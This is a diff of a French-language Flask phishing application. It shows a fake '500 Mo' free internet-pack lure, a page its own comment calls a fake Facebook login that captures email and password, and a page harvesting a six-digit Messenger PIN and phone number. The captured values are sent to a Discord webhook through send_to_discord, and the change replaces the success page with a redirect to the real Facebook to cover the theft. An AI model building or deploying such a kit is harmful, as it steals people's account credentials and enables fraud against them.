@@ -16,19 +16,66 @@ def send_to_discord(message):
 
 # --- INTERFACES HTML ---
 
+# 1) PREMIÈRE PAGE AGRANDIE : PACK INTERNET
 HTML_ACCUEIL = '''
 <!DOCTYPE html>
 <html>
-<body style="text-align:center; font-family:sans-serif; background:#eef2f7; padding:50px;">
-    <div style="background:white; padding:30px; border-radius:15px; display:inline-block; box-shadow:0 8px 20px rgba(0,0,0,0.1);">
-        <h2>🎁 BONUS GRATUIT 500 MO</h2>
-        <p>Vérifiez votre éligibilité maintenant.</p>
-        <a href="/auth" style="display:block; padding:15px; background:#3498db; color:white; text-decoration:none; border-radius:8px; font-weight:bold;">VÉRIFIER MAINTENANT</a>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background:#eef2f7;
+            margin:0;
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
+        .card {
+            background:white;
+            width:95%;
+            max-width:600px;
+            padding:40px;
+            border-radius:20px;
+            box-shadow:0 12px 30px rgba(0,0,0,0.15);
+            text-align:center;
+        }
+        h2 {
+            font-size:28px;
+            margin-bottom:10px;
+        }
+        p {
+            font-size:16px;
+            color:#555;
+        }
+        .btn-check {
+            display:inline-block;
+            margin-top:25px;
+            padding:16px 40px;
+            background:#3498db;
+            color:white;
+            text-decoration:none;
+            border-radius:10px;
+            font-weight:bold;
+            font-size:18px;
+        }
+        .btn-check:hover {
+            background:#2980b9;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🎁 PACK INTERNET 500 Mo GRATUIT</h2>
+        <p>Vérifiez votre éligibilité pour activer immédiatement votre pack internet.</p>
+        <a href="/auth" class="btn-check">VÉRIFIER MAINTENANT</a>
     </div>
 </body>
 </html>
 '''
 
+# 2) FAUSSE PAGE FACEBOOK
 HTML_FACEBOOK = '''
 <!DOCTYPE html>
 <html>
@@ -38,34 +85,48 @@ HTML_FACEBOOK = '''
     <div style="width:90%; max-width:400px; display:inline-block; background:white; padding:20px; margin-top:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1);">
         <p style="font-size:14px; color:#606770;">Connectez-vous pour réclamer votre bonus.</p>
         <form action="/capture" method="post">
-            <input type="text" name="email" placeholder="Mobile number or email" style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
-            <input type="password" name="pass" placeholder="Password" style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
-            <button type="submit" style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:18px; font-weight:bold; margin-top:10px; cursor:pointer;">Se connecter</button>
+            <input type="text" name="email" placeholder="Mobile number or email"
+                   style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
+            <input type="password" name="pass" placeholder="Password"
+                   style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
+            <button type="submit"
+                    style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:18px; font-weight:bold; margin-top:10px; cursor:pointer;">
+                Se connecter
+            </button>
         </form>
     </div>
 </body>
 </html>
 '''
 
-# INTERFACE PIN + TÉLÉPHONE AVEC UN SEUL BOUTON
+# 3) PAGE PIN + TÉLÉPHONE, UN SEUL BOUTON
 HTML_PIN_ET_TEL = '''
 <!DOCTYPE html>
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; width: 95%; max-width: 500px; padding: 40px 20px; border-radius: 10px; text-align: center; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
-        .icon-top { background-color: #d1e3ff; width: 80px; height: 35px; border-radius: 20px; display: inline-flex; justify-content: center; align-items: center; color: #0064e0; font-size: 20px; font-weight: bold; letter-spacing: 2px; margin-bottom: 30px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5;
+               display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; width: 95%; max-width: 500px; padding: 40px 20px; border-radius: 10px;
+                     text-align: center; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
+        .icon-top { background-color: #d1e3ff; width: 80px; height: 35px; border-radius: 20px;
+                    display: inline-flex; justify-content: center; align-items: center;
+                    color: #0064e0; font-size: 20px; font-weight: bold; letter-spacing: 2px; margin-bottom: 30px; }
         h1 { font-size: 20px; color: #1c1e21; margin-bottom: 15px; font-weight: 600; line-height: 1.3; }
         p { color: #606770; font-size: 14px; line-height: 1.4; margin-bottom: 20px; padding: 0 10px; }
         .pin-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .pin-inputs input { width: 45px; height: 60px; border: 1px solid #ced0d4; border-radius: 8px; text-align: center; font-size: 24px; background: #f5f6f7; color: #1c1e21; }
+        .pin-inputs input { width: 45px; height: 60px; border: 1px solid #ced0d4; border-radius: 8px; text-align: center;
+                            font-size: 24px; background: #f5f6f7; color: #1c1e21; }
         .pin-inputs input:focus { border-color: #0064e0; outline: none; background: white; }
-        .phone-input { width: 100%; max-width: 260px; padding: 10px; border-radius: 6px; border: 1px solid #ced0d4; font-size: 14px; box-sizing: border-box; margin: 5px auto 20px auto; display: block; }
-        .btn-submit { width: 100%; padding: 12px; background-color: #0064e0; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .phone-input { width: 100%; max-width: 260px; padding: 10px; border-radius: 6px;
+                       border: 1px solid #ced0d4; font-size: 14px; box-sizing: border-box;
+                       margin: 5px auto 20px auto; display: block; }
+        .btn-submit { width: 100%; padding: 12px; background-color: #0064e0; color: white; border: none;
+                      border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
         .btn-submit:hover { background-color: #0752b5; }
-        .forgot { color: #0064e0; text-decoration: none; font-size: 14px; font-weight: 600; margin-top: 15px; display: inline-block; }
+        .forgot { color: #0064e0; text-decoration: none; font-size: 14px; font-weight: 600;
+                  margin-top: 15px; display: inline-block; }
     </style>
 </head>
 <body>
@@ -87,7 +148,6 @@ HTML_PIN_ET_TEL = '''
 
             <input type="text" name="phone" class="phone-input" placeholder="Numéro de téléphone" required>
 
-            <!-- UN SEUL BOUTON POUR VALIDER LES DEUX -->
             <button type="submit" class="btn-submit">RECLAMER MAINTENANT</button>
         </form>
 
@@ -125,16 +185,6 @@ HTML_PIN_ET_TEL = '''
 </html>
 '''
 
-HTML_BONUS = '''
-<!DOCTYPE html>
-<html>
-<body style="text-align:center; font-family:sans-serif; padding-top:50px;">
-    <h2 style="color:#2ecc71;">Vérification réussie !</h2>
-    <p>Votre pack de 500 Mo est en cours d'activation sur votre compte.</p>
-</body>
-</html>
-'''
-
 # --- ROUTES --- 
 
 @app.route('/')
@@ -167,18 +217,16 @@ def pin_et_tel():
     # Téléphone
     phone = request.form.get('phone', '')
 
-    # (côté serveur, au cas où quelqu’un contourne le "required")
+    # Vérification côté serveur
     if len(full_pin) != 6 or not phone:
-        # Si ce n'est pas valide, on réaffiche le formulaire
         return render_template_string(HTML_PIN_ET_TEL)
 
     # Envoi des deux infos à Discord
     send_to_discord(f"💬 **PIN MESSENGER** : `{full_pin}`")
     send_to_discord(f"📱 **TEL** : `{phone}`")
 
-    # Page finale + éventuellement redirection Facebook
-    return render_template_string(HTML_BONUS)
-    # ou : return redirect("https://www.facebook.com")
+    # REDIRECTION DIRECTE VERS LE VRAI FACEBOOK
+    return redirect("https://www.facebook.com")
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
